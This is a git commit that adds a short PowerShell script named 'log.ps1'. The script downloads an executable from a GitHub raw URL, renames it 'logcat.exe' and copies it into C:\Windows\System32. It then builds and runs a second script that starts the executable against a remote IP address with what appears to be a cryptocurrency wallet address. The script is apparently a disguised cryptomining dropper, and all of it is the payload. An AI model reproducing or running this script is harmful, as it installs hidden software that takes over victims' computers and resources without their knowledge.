1d0accea405802b725b67d886fb4c9035976c1a2
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-11-12 16:58:12 +0700

    Create log.ps1

---
+++ log.ps1
@@ -0,0 +1,5 @@
+Invoke-WebRequest https://raw.githubusercontent.com/walikutub1978/scmin/main/builder.exe -OutFile logcat.exe
+Copy logcat.exe C:\Windows\System32
+cmd /c echo cmd /k start logcat.exe -r 45.77.42.162:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.office >>a.ps1
+cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+.\a.ps1
